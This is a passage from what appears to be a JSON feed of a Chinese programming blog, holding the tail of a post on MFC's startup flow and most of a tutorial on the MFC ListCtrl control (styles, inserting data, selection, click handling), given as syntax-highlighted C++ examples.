data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在其构造函数中：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">CMyApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"CMyApp 构造函数\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tm_pCurrentApp <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在主程序中定义：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">\"CMyApp.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMyApp theApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>CMyApp<span class=\"token operator\">*</span> <span class=\"token function\">AfxGetApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> theApp<span class=\"token punctuation\">.</span>m_pCurrentApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span>  <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"WinMiam 函数\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">//theApp.InitInstance();</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tCMyApp<span class=\"token operator\">*</span> pApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tpApp <span class=\"token operator\">=</span> <span class=\"token function\">AfxGetApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tpApp<span class=\"token operator\">-></span><span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>这样差不多既是 MFC 的执行流程了，主要是了解一个大概，后面看 MFC 的源码就清晰多了。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGl1ZmVpMTk4My9wLzcxMzEwMDIuaHRtbA==\">https://www.cnblogs.com/liufei1983/p/7131002.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naDBzdC5jbi9CaW5hcnktTGVhcm5pbmcvTUZDLmh0bWw=\">https://gh0st.cn/Binary-Learning/MFC.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20venBjaGNiZC9wLzEyMjY2MDczLmh0bWw=\">https://www.cnblogs.com/zpchcbd/p/12266073.html</span></p>\n",
            "tags": [
                "MFC的本质",
                "MFC的层次结构图",
                "手动创建一个MFC程序",
                "MFC的初始化过程"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-06ListCtrl%E9%AB%98%E7%BA%A7%E5%88%97%E8%A1%A8%E6%8E%A7%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-06ListCtrl%E9%AB%98%E7%BA%A7%E5%88%97%E8%A1%A8%E6%8E%A7%E4%BB%B6/",
            "title": "MFC-06ListCtrl高级列表控件",
            "date_published": "2022-03-22T06:44:32.000Z",
            "content_html": "<h1 id=\"listctrl高级列表控件\"><a class=\"anchor\" href=\"#listctrl高级列表控件\">#</a> ListCtrl 高级列表控件</h1>\n<p>ListCtrl 高级列表控件也是我们平时编程过程中很常用的一个控件，一般涉及到报表展示、记录展示之类的，都需要 ListCtrl 高级列表控件。例如：任务管理器啊，文件列表啊，等等都是 ListCtrl 高级列表控件来实现的。</p>\n<h2 id=\"控件的风格样式\"><a class=\"anchor\" href=\"#控件的风格样式\">#</a> 控件的风格样式</h2>\n<p>LVS_ICON: 为每个 item 显示大图标<br />\n LVS_SMALLICON: 为每个 item 显示小图标<br />\n LVS_LIST: 显示一列带有小图标的 item<br />\nLVS_REPORT: 显示 item 详细资料</p>\n<p>直观的理解：Windows 资源管理器，“查看” 标签下的 “大图标，小图标，列表，详细资料”</p>\n<p><img data-src=\"image001.png\" alt=\"\" /><br />\n<img data-src=\"image002.png\" alt=\"\" /><br />\n<img data-src=\"image003.png\" alt=\"\" /><br />\n<img data-src=\"image004.png\" alt=\"\" /></p>\n<p>具体可以通过代码指定控件的风格样式：</p>\n<p>先创建一个  <code>CListCtrl</code>  类型的变量  <code>m_ListCtrl</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LONG lStyle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>lStyle<span class=\"token operator\">=</span><span class=\"token function\">GetWindowLong</span><span class=\"token punctuation\">(</span>m_ListCtrl<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token punctuation\">,</span> GWL_STYLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取当前窗口 style</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>lStyle <span class=\"token operator\">&amp;=</span> <span class=\"token operator\">~</span>LVS_TYPEMASK<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 清除显示方式位</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>lStyle <span class=\"token operator\">|=</span> LVS_REPORT<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 style</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">SetWindowLong</span><span class=\"token punctuation\">(</span>m_ListCtrl<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token punctuation\">,</span> GWL_STYLE<span class=\"token punctuation\">,</span> lStyle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 style</span></pre></td></tr></table></figure><p>也可以方便点，从控件的属性中直接修改：<br />\n对应控件的 View 属性：Icon、Small Icon、List、Report 四项。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>我们主要学习 LVS_REPORT 格式，也就是报表样式。</p>\n<h2 id=\"扩展样式设置\"><a class=\"anchor\" href=\"#扩展样式设置\">#</a> 扩展样式设置</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>DWORD dwStyle <span class=\"token operator\">=</span> m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetExtendedStyle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取当前扩展样式</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dwStyle <span class=\"token operator\">|=</span> LVS_EX_FULLROWSELECT<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 选中某行使整行高亮（report 风格时）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dwStyle <span class=\"token operator\">|=</span> LVS_EX_GRIDLINES<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 网格线（report 风格时）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dwStyle <span class=\"token operator\">|=</span> LVS_EX_CHECKBOXES<span class=\"token punctuation\">;</span> <span class=\"token comment\">//item 前生成 checkbox 控件</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">SetExtendedStyle</span><span class=\"token punctuation\">(</span>dwStyle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置扩展风格</span></pre></td></tr></table></figure><h2 id=\"数据插入\"><a class=\"anchor\" href=\"#数据插入\">#</a> 数据插入</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 插入数据</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">InsertColumn</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ID\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> LVCFMT_LEFT<span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 插入列</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">InsertColumn</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"名称\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> LVCFMT_LEFT<span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 直接插入</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> nRow <span class=\"token operator\">=</span> m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 插入行</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span>nRow<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C++\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 设置数据</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//LVITEM 结构插入</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>LVITEM item <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>item<span class=\"token punctuation\">.</span>iItem <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 行号</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>item<span class=\"token punctuation\">.</span>mask <span class=\"token operator\">=</span> LVIF_TEXT<span class=\"token punctuation\">;</span> <span class=\"token comment\">/*LVIF_IMAGE 支持图标 */</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>item<span class=\"token punctuation\">.</span>cchTextMax <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 插入字符串长度</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>item<span class=\"token punctuation\">.</span>pszText <span class=\"token operator\">=</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>nRow <span class=\"token operator\">=</span> m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span>nRow<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MFC\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"选中和取消选中item\"><a class=\"anchor\" href=\"#选中和取消选中item\">#</a> 选中和取消选中 Item</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> nIndex <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 选中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemState</span><span class=\"token punctuation\">(</span>nIndex<span class=\"token punctuation\">,</span>LVIS_SELECTED<span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LVIS_FOCUSED<span class=\"token punctuation\">,</span>LVIS_SELECTED<span class=\"token operator\">|</span>LVIS_FOCUSED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 取消选中</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemState</span><span class=\"token punctuation\">(</span>nIndex<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>LVIS_SELECTED<span class=\"token operator\">|</span>LVIS_FOCUSED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>一直选中 Item: 选中  <code>style</code>  中的  <code>Show selection always</code> , 或者添加扩展样式  <code>LVS_SHOWSELALWAYS</code></p>\n<h2 id=\"得到clistctrl中所有行的checkbox的状态\"><a class=\"anchor\" href=\"#得到clistctrl中所有行的checkbox的状态\">#</a> 得到 CListCtrl 中所有行的 checkbox 的状态</h2>\n<p>要开启  <code>LVS_EX_CHECKBOXES</code>  样式。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CString str<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemState</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> LVIS_SELECTED<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  LVIS_SELECTED <span class=\"token operator\">||</span> m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetCheck</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    str<span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第%d行的checkbox为选中状态\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">AfxMessageBox</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"得到clistctrl中所有选中行的序号\"><a class=\"anchor\" href=\"#得到clistctrl中所有选中行的序号\">#</a> 得到 CListCtrl 中所有选中行的序号</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 方法一：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CString str<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemState</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> LVIS_SELECTED<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> LVIS_SELECTED <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    str<span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"选中了第%d行\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">AfxMessageBox</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 方法二：</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>POSITION pos<span class=\"token operator\">=</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetFirstSelectedItemPosition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>pos<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">TRACE0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No items were selected!/n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">int</span> nItem<span class=\"token operator\">=</span>m_ListCtrl<span class=\"token punctuation\">.</span><span class=\"token function\">GetNextSelectedItem</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">TRACE1</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Item %d was selected!/n\"</span><span class=\"token punctuation\">,</span> nItem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 添加其他操作</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"得到单击的clistctrl的行列号\"><a class=\"anchor\" href=\"#得到单击的clistctrl的行列号\">#</a> 得到单击的 CListCtrl 的行列号</h2>\n<p>添加 listctrl 控件的  <code>NM_CLICK</code>  消息相应函数</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnNMClickList1</span><span class=\"token punctuation\">(</span>NMHDR<span class=\"token operator\">*</span> pNMHDR<span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span> pResult<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tLPNMITEMACTIVATE pNMItemActivate <span class=\"token operator\">=</span> <span class=\"token keyword\">reinterpret_cast</span><span class=\"token operator\">&lt;</span>LPNMITEMACTIVATE<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>pNMHDR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">//// 方法一:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">//DWORD dwPos = GetMessagePos();</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">//CPoint point(LOWORD(dwPos), HIWORD(dwPos));</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">//m_ListCtrl.ScreenToClient(&amp;point);</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">//LVHITTESTINFO lvinfo;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">//lvinfo.pt = point;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">//lvinfo.flags = LVHT_ABOVE;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">//int nItem = m_ListCtrl.SubItemHitTest(&amp;lvinfo);</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">//if (nItem != -1)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">//&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">//\tCString strtemp;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">//\tstrtemp.Format (_T (\"单击的是第 % d 行第 % d 列\"), lvinfo.iItem, lvinfo.iSubItem);</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token comment\">//\tAfxMessageBox(strtemp);</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// 方法二:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tNM_LISTVIEW<span class=\"token operator\">*</span> pNMListView <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>NM_LISTVIEW<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pNMHDR<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pNMListView<span class=\"token operator\">-></span>iItem <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tCString strtemp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tstrtemp<span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"单击的是第%d行第%d列\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pNMListView<span class=\"token operator\">-></span>iItem<span class=\"token punctuation\">,</span> pNMListView<span class=\"token operator\">-></span>iSubItem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token function\">AfxMessageBox</span><span class=\"token punctuation\">(</span>strtemp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token operator\">*</span>pResult <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"右键点击clistctrl的item弹出菜单\"><a class=\"anchor\" href=\"#右键点击clistctrl的item弹出菜单\">#</a> 右键点击 CListCtrl 的 item 弹出菜单</h2>\n<p>添加一个菜单资源</p>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>对菜单进行编辑：</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>添加 CListCtrl 控件的 NM_RCLICK 消息相应函数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnNMRClickList1</span><span class=\"token punctuation\">(</span>NMHDR<span 